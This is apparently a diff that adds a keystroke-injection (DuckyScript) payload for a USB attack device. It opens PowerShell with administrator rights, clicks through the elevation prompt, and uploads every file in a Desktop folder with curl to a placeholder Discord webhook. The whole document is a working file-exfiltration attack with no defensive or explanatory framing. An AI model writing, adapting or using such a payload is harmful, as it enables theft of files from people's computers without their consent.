@@ -1,0 +1,13 @@
+REM sends a file from a given directory to a discord webhook or other interface.
+DELAY 500
+GUI r
+DELAY 1000
+STRING powershell
+DELAY 1000
+CTRL SHIFT ENTER
+DELAY 1500
+LEFT
+DELAY 1000
+ENTER
+DELAY 2000
+STRINGLN Set-Location "$HOME/Desktop/test" ; $filename = Get-ChildItem -Path "." -File | ForEach-Object { $_.Name }; foreach ($name in $filename) {curl.exe -F "file=@$name" "webhook"};exit
